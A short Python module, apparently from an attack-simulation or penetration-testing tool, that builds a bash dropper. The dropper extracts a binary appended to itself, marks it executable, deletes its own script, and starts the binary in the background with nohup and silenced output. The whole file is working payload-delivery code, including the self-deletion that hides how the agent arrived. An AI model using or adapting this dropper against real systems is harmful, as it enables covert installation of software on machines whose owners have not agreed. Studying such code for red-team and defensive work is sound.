from pathlib import PurePath
from typing import Sequence

DROPPER_SCRIPT = """#!/bin/bash
umask 077

DROPPER_SCRIPT_PATH=$0

PAYLOAD_LINE=$(awk '/^__PAYLOAD_BEGINS__/ { print NR + 1; exit 0; }' $0)
AGENT_DST_PATH="%(agent_dst_path)s"

tail -n +${PAYLOAD_LINE} $0 > "$AGENT_DST_PATH"
chmod u+x "$AGENT_DST_PATH"

rm "$DROPPER_SCRIPT_PATH"

nohup "$AGENT_DST_PATH" %(agent_args)s &>/dev/null &

exit 0
__PAYLOAD_BEGINS__
"""


def build_bash_dropper(
    agent_dst_path: PurePath, agent_args: Sequence[str], agent_binary: bytes
) -> bytes:
    dropper_script = DROPPER_SCRIPT % {
        "agent_dst_path": agent_dst_path,
        "agent_args": " ".join(f'"{arg}"' for arg in agent_args),
    }
    return dropper_script.encode() + agent_binary
